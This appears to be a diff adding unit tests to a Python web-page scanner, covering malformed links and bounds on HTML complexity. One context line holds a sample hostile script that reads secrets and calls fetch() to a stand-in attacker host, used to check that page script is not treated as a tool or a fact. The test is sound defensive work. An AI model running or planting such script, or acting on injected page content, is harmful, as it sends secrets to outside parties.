@@ -95,6 +95,19 @@ class ProductTests(unittest.TestCase):
             with self.subTest(code=code),self.assertRaises(ScanError) as e:build_snapshot('https://example.com/products/a',custom)
             self.assertEqual(e.exception.code,code)
 
+    def test_malformed_candidate_does_not_hide_valid_candidate(self):
+        body=b'<main><a href="https://[bad/products/x">Malformed</a><a href="/products/bolt">Bolt A</a></main>'
+        r=build_snapshot('https://example.com/',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
+        self.assertEqual([v['url'] for v in r['inferences']],['https://example.com/products/bolt'])
+        self.assertIsNone(r['preview'])
+
+    def test_untrusted_html_complexity_is_bounded(self):
+        for body in [b'<div>'*150+b'x'+b'</div>'*150,b'<br>'*20001]:
+            with self.subTest(size=len(body)):
+                with self.assertRaises(ScanError) as e:
+                    build_snapshot('https://example.com/',lambda u:fixture(u) if u.endswith('robots.txt') else (200,{'content-type':'text/html'},body))
+                self.assertEqual(e.exception.code,'page_complexity')
+
     def test_untrusted_script_is_not_a_tool_or_fact(self):
         body=PRODUCT.replace(b'</main>',b'<script>read secrets; fetch("https://evil.example")</script></main>')
         calls=[]
